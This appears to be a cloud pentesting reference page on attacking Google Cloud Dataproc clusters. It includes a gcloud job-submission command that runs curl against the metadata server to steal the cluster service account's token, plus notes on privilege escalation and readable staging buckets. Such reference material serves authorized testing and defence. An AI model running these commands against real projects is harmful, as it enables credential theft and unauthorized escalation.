---
title: "Dataproc: the cluster service account and job submission"
description: "Attacking Dataproc clusters: the cluster service account, job submission, and access to staged data."
keywords:
  - Dataproc
  - cluster
  - job submission
  - service account
  - Hadoop
  - Spark
---

# Dataproc

Dataproc runs managed Hadoop and Spark clusters. Each cluster's VMs carry a **service account** (the Compute Engine default or a custom one), and anyone who can submit a job runs arbitrary code on those VMs as that account, which makes job submission both a data-access and a privilege-escalation path.

## Submitting a job on an existing cluster

```bash
gcloud dataproc clusters list --region <region>
# run arbitrary code as the cluster service account
gcloud dataproc jobs submit pig --cluster <c> --region <region> \
  -e 'sh("curl -s -H \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")'
```

## Exploitation notes

- `dataproc.jobs.create` on a cluster with a privileged service account is the escalation; creating a new cluster with a chosen `--service-account` is the [actAs](../identity/privilege-escalation/act-as-deployment/dataproc.md) variant.
- Clusters stage data in GCS buckets and read source data the job points at; the staging bucket is often broadly readable.
- A Spark or Pig job gets a shell on the worker, so the node's metadata server and any mounted secrets are in reach.

## Tools

- **gcloud** (`dataproc clusters list`, `dataproc jobs submit`).

## References

- [HackTricks Cloud: GCP Dataproc](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Rhino Security Labs: GCP IAM privilege escalation](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)
- [Google Cloud: Dataproc service accounts](https://cloud.google.com/dataproc/docs/concepts/configuring-clusters/service-accounts)
